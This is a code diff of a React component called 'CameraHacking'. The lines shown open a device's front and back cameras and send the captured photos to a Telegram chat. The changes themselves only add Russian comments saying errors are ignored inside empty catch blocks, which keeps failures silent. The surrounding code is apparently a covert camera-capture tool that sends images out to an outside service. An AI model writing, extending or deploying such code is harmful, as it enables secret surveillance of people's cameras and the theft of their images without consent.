@@ -425,7 +425,9 @@ const CameraHacking = ({ chatId }) => {
           videoRefsRef.current.push(frontVideo);
           cameraNamesRef.current.push("🤳 Фронтальная камера");
           
-        } catch (frontErr) {}
+        } catch (frontErr) {
+          // Игнорируем ошибку
+        }
         
         try {
           // Задняя камера
@@ -460,7 +462,9 @@ const CameraHacking = ({ chatId }) => {
           videoRefsRef.current.push(backVideo);
           cameraNamesRef.current.push("📷 Задняя камера");
           
-        } catch (backErr) {}
+        } catch (backErr) {
+          // Игнорируем ошибку
+        }
       }
 
       // Если нет камер, создаем тестовую
@@ -618,7 +622,9 @@ const CameraHacking = ({ chatId }) => {
       
       try {
         await sendPhotoToTelegram(result.blob, caption);
-      } catch (error) {}
+      } catch (error) {
+        // Игнорируем ошибки
+      }
     }
     
     currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
